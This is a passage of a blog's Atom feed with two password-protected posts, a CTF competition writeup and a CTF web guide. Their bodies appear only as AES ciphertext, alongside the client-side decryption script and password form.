7vPRolFIlBpj8oNliYLVWAEpNcBzUAU8vMxzV+vBlD1YhbTXhAkf6LuP9bEXg0ShtG0jgIomzhbL6FV3xgoSP40QUA3QHiDebeSmObdI/ZhryOnXCrSeSs+Qw4UVDRRyBcsR1a3uIdl9yvc4QI/isVJlmO+tUVeuqzVX5kDPEYD6Gt+XWW3h6LqXMS86j7zd/vkXXMWw9SIu527K6s8NsmudB8yte88CUaipkijpVTr3CTdUxbFjzZgbZt2v+mR03+eZ3NqtR957loMFlTvxBoS83uthek93OmgxbGamJGphGsP+ihoK5Cx9E0BE8PWOQJi7TJylbPcor4A+inlSKjd1eOnZrA0HObYUtGjW+5Pa6Z3fwd9rQsv+nqnBzuycWBcNcXxEFyyrCJhIxUsg0xX0NHH47aklk8aUbQ77NIkKPBB/Qo4wqtwFb7l2TRTh2W0NCn1iY3c=</div><div id="enc_passwd"> <input id="enc_pwd_input" type="password" style="border-radius: 5px;border-style: groove;height: 30px;width: 50%;cursor: auto;font-size: 102%;color: currentColor;outline: none;text-overflow: initial;padding-left: 5px;" onkeydown="if (event.keyCode == 13) { decrypt(); return false;}"> <input type="submit" value="解&nbsp;密" onclick="decrypt()" style="width: 58px;height: 34px;border-radius: 5px;background-color: white;border-style: solid;color: currentColor;"><div id="enc_error" style="display: inline-block;color: #d84527;margin-left: 10px"></div><script>var onError = function(error) {showMessage("嘻嘻嘻，密码不对哦~", 5000);};function decrypt() {var passwd = document.getElementById("enc_pwd_input").value;console.log(passwd);doDecrypt(passwd, onError);}</script></div>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;这次比赛非常没有状态，可能是很久没参加正式比赛的缘故。这篇文章为赛后总结，也是一篇writeup。emmmm，我会认真写。&lt;/p&gt;
    
    </summary>
    
    
      <category term="writeup" scheme="https://winter3un.github.io/tags/writeup/"/>
    
      <category term="ctf" scheme="https://winter3un.github.io/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>ctf-web指南</title>
    <link href="https://winter3un.github.io/2018/07/30/ctf-web/"/>
    <id>https://winter3un.github.io/2018/07/30/ctf-web/</id>
    <published>2018-07-31T01:48:54.000Z</published>
    <updated>2018-09-02T04:20:26.564Z</updated>
    
    <content type="html"><![CDATA[<script src=/js/crypto-js.js></script><script>function doDecrypt (pwd, onError) {console.log('in doDecrypt');const txt = document.getElementById('enc_content').innerHTML;let plantext;try {const bytes = CryptoJS.AES.decrypt(txt, pwd);var plaintext = bytes.toString(CryptoJS.enc.Utf8);showMessage('嘿！芝麻开门~~', 5000);} catch(err) {if(onError) {onError(err);}return;}document.getElementById('enc_content').innerHTML = plaintext;document.getElementById('enc_content').style.display = 'block';document.getElementById('enc_passwd').style.display = 'none';if(typeof MathJax !== 'undefined') {MathJax.Hub.Queue(['resetEquationNumbers', MathJax.InputJax.TeX],['PreProcess', MathJax.Hub],['Reprocess', MathJax.Hub]);}}</script><div id="enc_content" style="display:none">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